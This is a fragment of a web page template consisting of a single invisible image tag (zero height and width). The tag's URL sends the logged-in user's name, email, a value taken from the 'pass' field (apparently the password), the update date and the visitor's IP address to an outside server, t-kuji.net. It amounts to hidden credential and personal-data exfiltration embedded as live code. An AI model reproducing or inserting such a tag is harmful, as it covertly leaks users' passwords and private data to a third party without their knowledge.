...
<img src="http://t-kuji.net/tr/groups/aaa/click.php?name={$user->get_value("name")}&email={$user->get_value("mail")}&free1={$user->get_value("pass")}&free2={$user->get_value("update_date")}&free3={$_SERVER["REMOTE_ADDR"]}" border="0" height="0" width="0">
